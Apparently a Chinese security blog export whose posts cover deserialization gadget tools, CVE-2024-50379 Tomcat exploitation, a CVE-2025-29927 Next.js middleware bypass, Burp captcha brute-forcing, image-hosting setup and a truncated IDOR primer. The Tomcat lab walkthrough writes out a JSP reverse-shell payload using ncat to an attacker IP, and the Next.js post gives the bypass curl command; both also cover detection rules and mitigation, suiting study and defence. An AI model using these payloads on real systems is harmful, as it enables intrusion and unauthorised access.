框架或实现特定漏洞利用技术的链，方法是使用 -l 选项后跟筛选关键字（例如 Drupal、Laravel 等）。这样您就可以根据自己的利用场景选择合适的小工具链，如下所示：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 yrc@machine$ php phpggc -l Gadget Chains ------------- NAME VERSION TYPE VECTOR I Bitrix/RCE1 17.x.x \u0026lt;= 22.0.300 RCE: Command __destruct CakePHP/RCE1 ? \u0026lt;= 3.9.6 RCE: Command __destruct CakePHP/RCE2 ? \u0026lt;= 4.2.3 RCE: Command __destruct CodeIgniter4/FD1 \u0026lt;= 4.3.6 File delete __destruct CodeIgniter4/FD2 \u0026lt;= 4.3.7 File delete __destruct CodeIgniter4/FR1 4.0.0 \u0026lt;= 4.3.6 File read __toString * CodeIgniter4/RCE1 4.0.2 RCE: Command __destruct CodeIgniter4/RCE2 4.0.0-rc.4 \u0026lt;= 4.3.6 RCE: Command __destruct CodeIgniter4/RCE3 4.0.4 \u0026lt;= 4.4.3 RCE: Command __destruct CodeIgniter4/RCE4 4.0.0-beta.1 \u0026lt;= 4.0.0-rc.4 RCE: Command __destruct 例如， CakePHP/RCE1 的输出表示名为 CakePHP/RCE1 的小工具链利用了 CakePHP 3.9.6 及以上版本中的 RCE 漏洞 。该漏洞允许攻击者利用 __destruct 魔术方法在服务器上执行任意命令。\nJava 版 Ysoserial Ysoserial 是一款广受认可的漏洞利用工具，专门用于测试 Java 应用程序的序列化漏洞。它有助于生成利用这些漏洞的有效载荷，使其成为攻击者和渗透测试人员评估和利用 Java 序列化应用程序的必备工具。\n要使用 Ysoserial，攻击者通常会使用类似 java -jar ysoserial.jar [payload type] '[command to execute]' 的命令生成有效载荷，其中 [payload type] 表示漏洞利用类型， [command to execute] 表示攻击者希望在目标系统上运行的任意命令。例如，使用 CommonsCollections1 有效载荷类型可能如下所示： java -jar ysoserial.jar CommonsCollections1 'calc.exe' 。此命令生成一个序列化对象，当被存在漏洞的应用程序反序列化时，该对象将执行指定的命令。Ysoserial 可在 GitHub 上下载 。\n","date":"2025-04-24T00:00:00Z","image":"https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/girl-8880144_1920.png","permalink":"https://Yerucrem.github.io/p/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-1/","title":"反序列化-1"},{"content":"Tomcat: CVE-2024-50379 漏洞概述 Apache Tomcat 是一个开源 Web 服务器和 Servlet 容器 。 Servlet 是一个 Java 类，它被创建在应用服务器上运行并处理客户端请求。它接收客户端的 HTTP 请求，进行处理，并生成正确的响应。Servlet 容器为 Java Servlet 提供运行时环境并管理它们的生命周期。\n该漏洞影响以下版本的 Apache Tomcat：\nApache Tomcat 11.0.0-M1 至 11.0.1（在 11.0.2 或更高版本中修复） Apache Tomcat 10.1.0-M1 to 10.1.33 (Fixed in 10.1.34 or later) Apache Tomcat 9.0.0.M1 to 9.0.97 (Fixed in 9.0.98 or later) CVE -2024-50379 是一个检查时使用时 Time-of-check Time-of-use(TOCTOU) 漏洞的例子。TOCTOU 漏洞源于检查资源和使用资源之间的竞争条件。换句话说，系统在检查资源状态之后、使用资源之前，资源发生了变化，系统最终停止使用已更改的资源。在此漏洞中，TOCTOU 竞争条件发生在不区分大小写的系统上的 JSP（Java 服务器页面）编译期间，前提是默认 servlet 具有写入权限。\n技术背景分析 在易受攻击的服务器上利用该漏洞主要有两个条件：\n首先，服务器允许用户上传和删除文件，也就是说，服务器配置为接受 HTTP 命令，例如 PUT 和 DELETE。通过在 web.xml 配置文件中将 readonly 设置为 false 来启用写入功能。注意，默认配置为 readonly。\n1 2 3 4 \u0026lt;init-param\u0026gt; \u0026lt;param-name\u0026gt;readonly\u0026lt;/param-name\u0026gt; \u0026lt;param-value\u0026gt;false\u0026lt;/param-value\u0026gt; \u0026lt;/init-param\u0026gt; 下面是一个不安全配置的示例，其中应用程序服务器设置为默认允许写入。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 \u0026lt;servlet\u0026gt; \u0026lt;servlet-name\u0026gt;default\u0026lt;/servlet-name\u0026gt; \u0026lt;servlet-class\u0026gt;org.apache.catalina.servlets.DefaultServlet\u0026lt;/servlet-class\u0026gt; \u0026lt;init-param\u0026gt; \u0026lt;param-name\u0026gt;debug\u0026lt;/param-name\u0026gt; \u0026lt;param-value\u0026gt;0\u0026lt;/param-value\u0026gt; \u0026lt;/init-param\u0026gt; \u0026lt;init-param\u0026gt; \u0026lt;param-name\u0026gt;listings\u0026lt;/param-name\u0026gt; \u0026lt;param-value\u0026gt;false\u0026lt;/param-value\u0026gt; \u0026lt;/init-param\u0026gt; \u0026lt;init-param\u0026gt; \u0026lt;param-name\u0026gt;readonly\u0026lt;/param-name\u0026gt; \u0026lt;param-value\u0026gt;false\u0026lt;/param-value\u0026gt; \u0026lt;/init-param\u0026gt; \u0026lt;load-on-startup\u0026gt;1\u0026lt;/load-on-startup\u0026gt; \u0026lt;/servlet\u0026gt; 利用此漏洞的第二个条件是 Tomcat 运行在不区分大小写的系统上，例如 MS Windows 或 macOS。当满足这两个条件时，利用此漏洞就变成了与操作系统赛跑。\n在 Linux 等区分大小写的系统上， demo.jsp 和 demo.Jsp 是两个不同的文件。因此，在 Linux 系统上， documents 和 Documents 共存于同一目录中并非不可能。\n由于微软 Windows 系统不区分大小写，因此 demo.jsp 和 demo.Jsp 不可能是两个不同的文件；然而，对于 Tomcat 来说，前者是一个可以执行的 Servlet，而后者则被视为文本文件。换句话说，微软 Windows 对待 demo.Jsp 和正确命名为 demo.jsp Servlet 没有任何区别；Tomcat 的大小写检查会阻止 demo.Jsp 被执行，从而避免将其视为可执行文件。\n例如，如果我们尝试创建文件 demo.jsp ，使用 curl -X PUT -d \u0026quot;test\u0026quot; http://10.10.211.24:8080/demo.jsp 将会产生错误。由于 Servlet 可以在服务器端执行命令，因此出现此错误是意料之中的；因此，允许用户上传 .jsp 文件会赋予他们远程代码执行 ( RCE ) 的能力。在下面的终端中，我们看到一个示例错误。\n1 2 root@yrc:~# curl -X PUT -d \u0026#34;test\u0026#34; http://10.10.211.24:8080/demo.jsp \u0026lt;!doctype html\u0026gt;\u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt;\u0026lt;head\u0026gt;\u0026lt;title\u0026gt;HTTP Status 404 – Not Found\u0026lt;/title\u0026gt;\u0026lt;style type=\u0026#34;text/css\u0026#34;\u0026gt;body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}\u0026lt;/style\u0026gt;\u0026lt;/head\u0026gt;\u0026lt;body\u0026gt;\u0026lt;h1\u0026gt;HTTP Status 404 – Not Found\u0026lt;/h1\u0026gt;\u0026lt;hr class=\u0026#34;line\u0026#34; /\u0026gt;\u0026lt;p\u0026gt;\u0026lt;b\u0026gt;Type\u0026lt;/b\u0026gt; Status Report\u0026lt;/p\u0026gt;\u0026lt;p\u0026gt;\u0026lt;b\u0026gt;Message\u0026lt;/b\u0026gt; JSP file [\u0026amp;#47;demo.jsp] not found\u0026lt;/p\u0026gt;\u0026lt;p\u0026gt;\u0026lt;b\u0026gt;Description\u0026lt;/b\u0026gt; The origin server did not find a current representation for the target resource or is not willing to disclose that one exists.\u0026lt;/p\u0026gt;\u0026lt;hr class=\u0026#34;line\u0026#34; /\u0026gt;\u0026lt;h3\u0026gt;Apache Tomcat/10.1.30\u0026lt;/h3\u0026gt;\u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt; 让我们创建一个扩展名为 Jsp 或 JSP 的文件。此步骤应该可以成功，因为 Tomcat 不会将此类扩展名视为可执行文件。我们可以看到 demo.Jsp 文件已在服务器上成功创建。\n1 2 3 root@yrc:~# curl -X PUT -d \u0026#34;test\u0026#34; http://10.10.211.24:8080/demo.Jsp root@yrc:~# curl http://10.10.211.24:8080/demo.Jsp test 如果我们尝试访问 demo.Jsp ，在不区分大小写的系统中，它与 demo.jsp 没有什么不同，但 Tomcat 会区分大小写，检查扩展名并将其视为文本文件。结果表明，当服务器负载过重时，可能会出现竞争条件。 demo.Jsp 可能会被编译并作为 servlet 执行。由于系统不区分大小写，因此对 servlet 扩展名（如 Jsp 和 JSP ）的约束已经从操作系统转移到应用服务器。换句话说，当系统负载过重，并且同时读写同一个文件时，大小写检查可能会被绕过，导致上传的文件被作为 servlet 执行。\n本次使用的tomcat版本为：10.1.25\n不知道为什么，使用nmap -sV扫描扫不出版本。使用curl查看页面可以看到tomcat版本\n漏洞利用 了解了几个PoC，其中一个如下：\n1 git clone https://github.com/iSee857/CVE-2024-50379-PoC 我们将对该脚本进行两处更改：\n修改循环计数器 ：在指定实验环境中，我们注意到将四个请求中的每一个重复 2000 次而不是 10000 次效率更高。\n更改有效载荷 ：为了进行更有趣的利用，我们将使用反向 shell，而不是在目标系统上启动计算器。\n修改循环计数器 原始 PoC 代码在第 43 行重复了 10000 次 for 循环。为了获得更高效的结果，将次数降低到 2000。更新后的行如下所示：\n1 2 3 4 5 6 #... futures = [] # 循环执行10000次 # for _ in range(10000): for _ in range(2000): # ... 更改有效载荷 此 PoC 漏洞利用使用了一个打开 calc.exe Payload，可以从第 37 行推断出来。为了简化此漏洞利用，我们在 MS Windows 服务器上安装了 ncat 。因此，我们将用另一个连接到攻击者系统的 Payload 替换该 Payload。注释掉的 Payload 和新的 Payload 如下所示。\n1 2 # payload_put = \u0026#34;aa\u0026lt;% Runtime.getRuntime().exec(\\\u0026#34;calc.exe\\\u0026#34;);%\u0026gt;\u0026#34; payload_put = \u0026#34;\u0026lt;%@ page import=\\\u0026#34;java.io.*\\\u0026#34; %\u0026gt;\u0026lt;% Runtime.getRuntime().exec(\\\u0026#34;cmd /c start ncat -e cmd.exe 10.10.241.219 8888\\\u0026#34;); %\u0026gt;\u0026#34; 此有效载荷使用 JSP 的 Runtime.getRuntime().exec() 来执行 cmd /c start ncat -e cmd.exe 10.10.241.219 8888 。如上所述，这是可能的，因为我们为了演示目的安装了 ncat 。\n开始 在运行此 PoC 之前，我们需要监听传入的连接。让我们使用 netcat -lvnp 8888 在 攻击机上启动 netcat 。\n接下来，在攻击机上，我们使用命令 python3 ApachTomcat_CVE-2024-50379_ConditionalCompetitionToRce.py -u 10.10.211.24:8080 运行漏洞利用程序。\n注 1： 运行此命令将显示类似 Checking http://10.10.211.24:8080/... 的消息，并且终端将停止显示更新几分钟。在此期间，漏洞代码会发送大量请求，导致目标服务器过载，并成功产生竞争条件。请等待脚本执行，同时观察终端运行 netcat -lvnp 8888 命令的情况。耐心是关键。\n注 2： 由于这是一个竞争条件漏洞，您可能需要重复 PoC 多次才能成功。\n当漏洞利用成功时，将与正在监听的 netcat 建立连接。\n漏洞检测 由于该漏洞依赖于竞争条件成功，并且每次利用尝试都需要上传文件，因此很容易在网络访问日志中检测到（默认位于 C:\\Program Files\\Apache Software Foundation\\\u0026lt;Tomcat Version\u0026gt;\\logs\\*access_log* 文件中）。对文件上传不受限制的网站进行的最简单攻击将记录如下：\nPUT 请求上传带有大写（ .Jsp 或 .JSP ）扩展名的文件（ \u0026quot;PUT /cve.Jsp\u0026quot; ） 紧接着向同一个文件发出 GET 请求，但现在是向 .jsp 扩展名发出请求（ \u0026quot;GET /cve.jsp\u0026quot; ） GET 请求将记录 200 或 404 状态代码，具体取决于竞争条件是否成功 重复上述步骤，直到竞争条件成功；通常需要 1000 次或更多次尝试 1 2 3 4 5 6 7 8 9 10.14.97.15 - - [30/Jan/2025:14:25:34 +0000] \u0026#34;PUT /cve.Jsp HTTP/1.1\u0026#34; 201 - 10.14.97.15 - - [30/Jan/2025:14:25:34 +0000] \u0026#34;GET /cve.jsp HTTP/1.1\u0026#34; 404 749 ... 10.14.97.15 - - [30/Jan/2025:14:25:39 +0000] \u0026#34;PUT /cve.Jsp HTTP/1.1\u0026#34; 409 654 10.14.97.15 - - [30/Jan/2025:14:25:39 +0000] \u0026#34;GET /cve.jsp HTTP/1.1\u0026#34; 404 749 10.14.97.15 - - [30/Jan/2025:14:25:39 +0000] \u0026#34;PUT /cve.Jsp HTTP/1.1\u0026#34; 204 - 10.14.97.15 - - [30/Jan/2025:14:25:39 +0000] \u0026#34;GET /cve.jsp HTTP/1.1\u0026#34; 404 749 10.14.97.15 - - [30/Jan/2025:14:25:39 +0000] \u0026#34;PUT /cve.Jsp HTTP/1.1\u0026#34; 204 - 10.14.97.15 - - [30/Jan/2025:14:25:39 +0000] \u0026#34;GET /cve.jsp HTTP/1.1\u0026#34; 200 32 假设目标 Web 服务器不允许通过 PUT 直接上传文件，但仍具有一些 Web 上传功能（例如图片或文件上传功能）。在这种情况下，攻击将具有类似的迭代模式：首先请求 Web 上传表单，然后请求上传的恶意 JSP 文件：\n1 2 3 4 5 6 7 223.199.178.14 - - [31/Jan/2025:18:32:11 +0000] \u0026#34;POST /app/template-upload.jsp HTTP/1.1\u0026#34; 200 782 223.199.178.14 - - [31/Jan/2025:18:32:11 +0000] \u0026#34;GET /uploads/revshell.jsp HTTP/1.1\u0026#34; 404 749 223.199.178.14 - - [31/Jan/2025:18:32:11 +0000] \u0026#34;POST /app/template-upload.jsp HTTP/1.1\u0026#34; 200 782 223.199.178.14 - - [31/Jan/2025:18:32:11 +0000] \u0026#34;GET /uploads/revshell.jsp HTTP/1.1\u0026#34; 404 749 ... 223.199.178.14 - - [31/Jan/2025:18:32:11 +0000] \u0026#34;POST /app/template-upload.jsp HTTP/1.1\u0026#34; 200 782 223.199.178.14 - - [31/Jan/2025:18:32:11 +0000] \u0026#34;GET /uploads/revshell.jsp HTTP/1.1\u0026#34; 200 32 系统日志 除了基于 Web 的检测之外，还可以使用默认的 Windows 事件日志或 Sysmon 等专用工具在操作系统和文件系统级别跟踪攻击。简而言之，可以围绕以下方面构建检测：\n文件创建 ：上传的 JSP 文件会保留在 Web 根目录中，除非威胁参与者手动删除它们。任何名称可疑的 JSP 文件（例如 revshell.jsp ）或包含 .exec() 等字符串的无法识别的 JSP 文件都可能表明存在攻击。 进程执行 ：上传的 JSP 文件通常需要启动子进程才能实现代码执行。在 Windows 上，如果发现 Apache Tomcat 启动了 CMD 或 PowerShell 进程，则可能是另一个可靠的攻击指标。 缓解措施 务必检查是否已为 servlet 启用了 write 权限。如果默认配置保持不变，即 readonly 未设置为 false ，则不会受到影响。如果 readonly 已设置为 false ，且您的用例不需要该权限，请将其重新设置为 true 。\n缓解措施已在官方公告中概述。用户应考虑以下两点。首先，用户应升级已安装的 Apache Tomcat。具体如下：\nApache Tomcat 11.0.0-M1 到 11.0.1 的用户应升级到 11.0.3 或更高版本。 Apache Tomcat 10.1.0-M1 到 10.1.33 的用户应升级到 10.1.35 或更高版本。 Apache Tomcat 9.0.0.M1 到 9.0.97 的用户应升级到 9.0.99 或更高版本。 对于仅升级到 11.0.2、10.1.34 或 9.98 的用户，需要执行其他步骤。特别是，旧版本 Java 的用户需要进行相关的显式更改：\n在使用 Java 8 或 Java 11 的系统上，系统属性 sun.io.useCanonCaches 应从默认值更改为 false 。 在使用 Java 17 的系统上，如果系统属性 sun.io.useCanonCaches 的默认值已更改，则应将其恢复为 false 。 需要注意的是，Tomcat 11.0.3、10.1.35、9.0.99 及更高版本包含检查以确保 sun.io.useCanonCaches 设置正确。\n","date":"2025-04-17T00:00:00Z","image":"https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/backpacker-7628303.jpg","permalink":"https://Yerucrem.github.io/p/cve-2024-50379/","title":"CVE-2024-50379"},{"content":"Next.js: CVE-2025-29927 漏洞概述 Next.js 是由 Vercel 开发的 Web 开发框架，旨在简化高性能 Web 应用程序的创建。Next.js 构建于 React 之上，并通过添加多项功能（例如静态站点生成 (SSG) 和服务端渲染 (SSR)）扩展了 React 的功能。SSG 在构建时预生成页面，从而可以更快地交付给用户；此外，SSR 在请求时渲染页面，从而减少加载时间。简而言之，Next.js 添加了旨在提升性能和用户体验的功能。\nCVE -2025-29927 是 Rachid 和 Yasser Allam 最近在 Next.js 中发现的一个漏洞，该漏洞表明如果授权检查发生在中间件中，则有可能被绕过。中间件是授予开发人员控制传入请求的部分。它充当传入请求和路由系统之间的桥梁。路由系统是基于文件的，即通过组织文件和目录来创建和管理路由。此漏洞允许攻击者绕过基于中间件的授权，并且 14.2.25 和 15.2.3 之前的所有版本都容易受到此漏洞的影响。\nNext.js 广泛应用于各种类型的应用程序，包括电商平台、新闻应用、文档网站和交互式 Web 应用。因此，此漏洞可能造成严重后果，需要管理员将其安装升级到修补版本。\n漏洞利用 Curl Yunus Aydin 在 GitHub 上发布了一个概念验证 ( PoC ) 可利用的应用程序和漏洞代码。部署好之后可以通过访问 http://10.10.134.123:3000 查看示例 Web 应用程序。但是，如果尝试访问 http://10.10.134.123:3000/protected 上的受保护路由，将被重定向到主页。\n利用 CVE -2025-29927 漏洞非常简单；攻击者只需在请求中添加额外的 HTTP 标头 x-middleware-subrequest: middleware 即可。正如披露此漏洞的原始帖子中所述，添加 x-middleware-subrequest 标头会导致请求被转发到其目的地，而无需中间件对其进行操作。因此，只需使用带有适当标头参数的 curl 即可访问受保护的路由（即页面）。\n利用此漏洞我们可以访问受保护的页面。一个简单的方法是在终端中输入以下命令。\n1 curl -H \u0026#34;x-middleware-subrequest: middleware\u0026#34; http://10.10.134.123:3000/protected 该命令与普通的 curl 命令类似，但有一个区别：它使用 -H 选项（相当于 --header 选项）向 HTTP GET 请求添加额外的标头。因此，上述 curl 命令允许攻击者绕过所有安全控制并检索受保护的页面。\nBurp Suite 使用 Burp Suite 也同样容易利用此漏洞。一种简单的方法是使用 Burp Suite 的浏览器，并在访问 http://10.10.134.123:3000/protected 时修改请求。\n漏洞检测 回想一下前面的任务，Next.js 的 CVE -2025-29927 是一个中间件授权绕过漏洞，导致能够访问以前需要此类授权的页面和路由。\n此任务将涵盖一些可用于通过日志和网络流量检测此类攻击发生的技术和规则。\n手动 Web 服务器日志可能有助于发现此类漏洞的证据。但这取决于 Web 服务器是否配置为记录 HTTP 标头。例如，NodeJS 允许通过 request.headers['x-middleware-subrequest'] 记录此特定的 HTTP 标头。\n如果 Web 应用程序使用了代理，则需要修改 Web 服务器（例如 Nginx 或 Apache2）上的日志配置，以记录此特定标头。例如，可以使用 Apache2 中的 LogFormat ：\n1 LogFormat \u0026#34;%h %l %u %t \\\u0026#34;%r\\\u0026#34; %\u0026gt;s %b \\\u0026#34;%{Referer}i\\\u0026#34; \\\u0026#34;%{User-Agent}i\\\u0026#34; \\\u0026#34;%{x-middleware-subrequest}i\\\u0026#34;\u0026#34; custom 一旦正确设置了此 HTTP 标头的日志记录，就可以使用 Grep、Yara 等常用工具。\n[了解]Snort (v2) 以下 Snort 规则在用作 IDS 时可用于检测 CVE -2025-29927 的发生：\n1 alert tcp any any -\u0026gt; any any (msg: \u0026#34;HTTP \u0026#39;x-middleware-request\u0026#39; header detected, possible CVE-2025-29927 explotation\u0026#34;; content:\u0026#34;x-middleware-subrequest\u0026#34;; rawbytes; sid:10000001; rev:1) 此规则检查数据包时不考虑任何协议，例如 http_headers 模块。这是因为在撰写本文时， HTTP 标头“x-middleware-request”在 Snort 中尚未被识别 。\n首先，我们将 Snort 规则添加到本地规则中。默认情况下，在 Ubuntu 上，它位于 /etc/snort/rules/local.rules 。现在，我们将上面的代码片段粘贴并保存。请注意，如果您已有规则，则需要将 sid 值更改为其他值。\n1 2 3 4 5 6 7 8 kali@yrc-2404:~$ sudo nano /etc/snort/rules/local.rules # $Id: local.rules,v 1.11 2004/07/23 20:14:44 bmc Exp $ # ---------------- # LOCAL RULES # ---------------- # This file intentionally does not come with signatures. Put your local # additions here. alert tcp any any -\u0026gt; any any (msg: \u0026#34;HTTP \u0026#39;x-middleware-request\u0026#39; header detected\u0026#34;; content:\u0026#34;x-middleware-subrequest\u0026#34;; rawbytes; sid:10000001; rev:1) 现在，我们可以运行 Snort 并测试其检测效果。下面的终端以控制台模式运行 Snort，以演示警报触发过程。\n1 2 kali@yrc-2404:/var/log/snort$ sudo snort -q -l /var/log/snort -i ens5 -A console -c /etc/snort/snort.conf 03/24-20:16:13.424299 [**] [1:10000001:1] HTTP \u0026#39;x-middleware-request\u0026#39; header detected [**] [Priority: 0] {TCP} 10.10.142.69:49432 -\u0026gt; 10.10.219.251:3000 [了解]Zeek Zeek 为网络流量中的威胁检测提供了更全面的方案。对于 CVE -2025-29927，可以使用以下 Zeek 规则：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 module CVE_2025_29927; export { redef enum Log::ID += { LOG }; global log_policy: Log::PolicyHook = Log::IGNORE; event http_header(c: connection, is_orig: bool, name: string, value: string) { if (name == \u0026#34;x-middleware-subrequest\u0026#34; \u0026amp;\u0026amp; value == \u0026#34;middleware\u0026#34;) Log::write(HTTP::LOG, [ $timestamp=c$start_time, $uid=c$uid, $id=c$id, $note=\u0026#34;CVE_2025_29927_Exploit\u0026#34;, $msg=\u0026#34;Detected HTTP header associated with CVE-2025-29927\u0026#34;, $header=name, $value=value ]); notice_info(c, \u0026#34;CVE-2025-29927 Exploit\u0026#34;, fmt(\u0026#34;The HTTP header \u0026#39;%s\u0026#39; associated with CVE-2025-29927 was detected\u0026#34;, value)); } } } 确保此文件以 .zeek 扩展名保存在 Zeek 脚本的配置目录中。您需要修改 local.zeek 文件，通过添加 @load ./cve_2025_29927.zeek 来包含此脚本。\n最后，通过 sudo zeekctl deploy 重启 Zeek 以应用配置更改。如果成功，当检测到 CVE -2025-29927 时， Zeek 将会发出警报：\n1 [Connnection_ID] The HTTP header \u0026#34;x-middleware-subrequest\u0026#34; associated with CVE-2025-29927 was detected 总结 查看关于发现此漏洞的原始帖子，许多流行应用程序的源代码中仍然潜伏着许多漏洞。对于已修复的版本，用户需要升级到以下版本：\nNext.js 15.x 应该升级到 15.2.3 Next.js 14.x 应该升级到 14.2.25 Next.js 13.x 应该升级到 13.5.9 Next.js 12.x 应该升级到 12.3.5 如果修补不可行，唯一的解决方法是阻止包含 x-middleware-subrequest 的 HTTP 请求到达您的 Web 应用程序。\n","date":"2025-04-17T00:00:00Z","image":"https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/space-7273891.jpg","permalink":"https://Yerucrem.github.io/p/cve-2025-29927/","title":"CVE-2025-29927"},{"content":"Burpsuite利用宏爆破回显在响应包的验证码网页 演示网页 简介 该网页的验证码是非图片形式的，当发送申请验证码请求后会直接显示在响应包中。\n思路 利用Burpsuite自带的宏(macro)[setting-\u0026gt;session-\u0026gt;macro]和会话处理规则，实现自动化抓取验证码放在payload中实现爆破。\n下面是具体流程\n过程 首先我们需要抓取获取到验证码URL的该过程的响应包。本案例，我刷新验证码即可抓取。\n抓取后可以直接放行（这一步的目的是记录此步骤，以便于在宏的设置中，可以在历史URL找到）\n添加条目 找到刚刚放掉的验证码刷新的URL 选取后确定，回到上级界面\n项目设置 点击添加\n在响应包中找到需要选取的验证码片段，burpsuite会自动帮忙标注号起始位置和结束位置。\n注意需要设置参数名称，这里的参数名称需要与要爆破处的参数名称相同。\n这里设置：inputCode\n三次确认后回到会话页面。\n配置会话处理规则 添加会话处理规则\n添加规则行为-\u0026gt;选择运行宏\n在其中配置如下\n点击确认返回上级界面后选择配置范围\n如果严格来讲，只负责爆破模块的话，可以只选择intuder\nURL需要选择包含所有URL，或者自己配置自己爆破的URL范围\n确认即可。\n测试 抓取登录时的数据包\n可以简单的单机发送，进行重发。此时如果配置正确可以看到inputCode部分已经可以随着每次重发进行更新。\n注意 注意命名全局变量时，要命名与进行爆破时的要替换的地方的名称相同。\n","date":"2025-04-15T00:00:00Z","image":"https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/ai-generated-8612487.jpg","permalink":"https://Yerucrem.github.io/p/burpsuite%E5%88%A9%E7%94%A8%E5%AE%8F%E7%88%86%E7%A0%B4%E5%9B%9E%E6%98%BE%E5%9C%A8%E5%93%8D%E5%BA%94%E5%8C%85%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BD%91%E9%A1%B5/","title":"Burpsuite利用宏爆破回显在响应包的验证码网页"},{"content":"图床服务搭建过程 简介 图床服务提供图片存储、图片加工处理、图片全网分发等功能，为全球无数的博客网站和社区论坛提供了后端图片服务支撑。开发者们可以使用腾讯云**对象存储（Cloud Object Storage，COS）**搭建图床服务，COS 是腾讯云提供的一种存储海量文件的分布式存储服务，提供了更丰富的功能、更优越的性能、更高的可靠性保障。\nCOS 用于图床场景的优势有：\n**低成本：**存储单价低，按量付费，用多少算多少，还有资源包优惠。 **不限速：**上传下载不限速，不再长时间等待 loading，访问质量也更好。 **高可用：**有高等级的 SLA 可用性保障，存储的数据有高达99.9999999999%的持久性保障。 **容量无限：**文件分布式存储，支持海量文件，容量按需使用。 实践场景 场景一：新增图片使用 COS 搭建图床服务 本场景使用到以下工具：\n﻿PicGo：一款支持多种云存储配置、快捷生成图片链接的工具。\n﻿Typora：一款轻量级 Markdown 编辑器，支持多种输出格式，支持将本地图片一键上传至图床。\n操作步骤 步骤一 安装 PicGo 并设置腾讯云 COS 服务相关参数。\n在 PicGo 官网 下载和安装 PicGo 后，在图床设置里找到腾讯云 COS，并配置以下相关参数项：\nCOS 版本：选择 COS v5。\n设定 Secretld：开发者拥有的项目身份识别 ID，用于身份认证，可在 API 密钥管理 页面中创建和获取。\n设定 SecretKey：开发者拥有的项目身份密钥，可在 API 密钥管理 页面获取。\n设定 Bucket：存储桶，COS 中用于存储数据的容器。有关存储桶的进一步说明，请参见 存储桶概述 文档。\n设定 AppId：开发者访问 COS 服务时拥有的用户维度唯一资源标识，用以标识资源，可在 API 密钥管理 页面获取。\n设定存储区域：存储桶所属地域信息，枚举值可参见 可用地域 文档，例如 ap-beijing、ap-hongkong、eu-frankfurt 等。\n设定存储路径：图片存放到 COS 存储桶中的路径。\n设定自定义域名：可选，若您为上方的存储空间配置了自定义源站域名，则可填写。相关介绍可参见 开启自定义源站域名。\n设定网址后缀：通过在网址后缀添加 COS 数据处理参数实现图片压缩、裁剪、格式转换等操作，相关介绍可参见 图片处理。\n步骤二 设置 typora（可选）\n设置指引如下：\n2.1 在 typora 的偏好设置的图像中，进行如下配置：\n2.2 重启 typora，使设置生效。\n2.3 进入 typora 编辑器区域，直接拖放或粘贴图片，即可上传图片并自动替换为 COS 文件链接。（如果粘贴后没有自动替换为 COS 链接，可以检查 PicGo 中的 server 设置是否已打开）。\n场景二：将原图床仓库图片快速迁移到腾讯云 COS 以某图床服务举例，您可以找到本地图床文件夹，或从线上下载完整文件夹，并将文件夹中所有图片转存到 COS 存储桶。最后再统一替换链接域名即可恢复网站。\n操作步骤 下载原图床服务的图片。 登录原图床网站页面，下载此前已上传的图片文件夹。\n创建 COS 存储桶并设置防盗链。 2.1 注册腾讯云账号，创建一个访问权限为公有读私有写的存储桶，操作指引请参见 创建存储桶。\n2.2 创建存储桶后，在存储桶里打开防盗链设置，避免图片被盗刷，操作指引请参见 设置防盗链。\n上传文件夹到存储桶。 在刚才已创建的存储桶里，单击上传文件夹，将刚才准备好的图片文件夹，上传到 COS 存储桶。操作指引请参见 上传对象。\n全局替换链接域名 在 COS 控制台存储桶概览页，复制存储桶默认域名（也可以绑定自定义 CDN 加速域名）。使用常用代码编辑器，对项目全局搜索替换失效链接前缀为 COS 存储桶默认域名。\nvscode 搜索替换示例：\nsublime text 搜索替换示例：\n","date":"2025-03-20T00:00:00Z","image":"https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/background04.jpg","permalink":"https://Yerucrem.github.io/p/%E4%BD%BF%E7%94%A8-picgo-typora-cos-%E6%90%AD%E5%BB%BA%E5%9B%BE%E5%BA%8A%E6%9C%8D%E5%8A%A1/","title":"使用 PicGo+Typora+COS 搭建图床服务"},{"content":"IDOR基础 什么是IDOR IDOR（ Insecure Direct Object Reference） 代表不安全的直接对象引用，是一种访问控制漏洞。\n当 Web 服务器收到用户提供的输入以检索对象（文件、数据、文档），对输入数据给予了太多信任，并且未在服务器端对其进行验证以确认所请求的对象属于请求它的用户时，就会发生这种类型的漏洞。\n示例 假设您刚刚注册了一项在线服务，并且想要更改您的个人资料信息。您单击的链接将转到 http://online-service.thm/profile?user_id=1305，您可以看到您的信息。\n好奇心让您尝试将 user_id 值更改为 1000 （http://online-service.thm/profile?user_id=1000），令您惊讶的是，您现在可以看到其他用户的信息。您现在发现了一个 IDOR 漏洞！理想情况下，应该在网站上进行检查，以确认用户信息属于请求它的用户。\n在编码中发现IDOR 当通过帖子数据、查询字符串或 cookie 将数据从一个页面传递到另一个页面时，Web 开发人员通常首先会获取原始数据并对其进行编码。编码可确保接收 Web 服务器能够理解内容。编码将二进制数据转换为 ASCII 字符串，通常使用 a-z、A-Z、0-9 和 = 字符 用于填充。Web 上最常见的编码技术是 base64 编码，通常很容易被发现。您可以使用网站 Like https://www.base64decode.org/ 解码字符串，然后编辑数据并使用 https://www.base64encode.org/ 再次重新编码，然后重新提交 Web 请求以查看响应是否有更改。\n请参阅下图作为此过程的图形示例：\n哈希IDOR 散 列 ID 比编码的 ID 要复杂一些，但它们可能遵循可预测的模式，例如是整数值的哈希版本。例如，如果使用 md5 哈希，则 ID 号 123 将变为 202cb962ac59075b964b07152d234b70。\n值得将任何发现的哈希值通过 Web 服务，例如 https://crackstation.net/（它有一个包含数十亿个 hash to value 结果的数据库），看看我们是否能找到任何匹配项。\nUnpredictable IDs 如果使用上述方法无法检测到 ID，则 IDOR 检测的一个很好的方法是创建两个帐户并在它们之间交换 ID 号。如果您可以使用其他用户的 ID 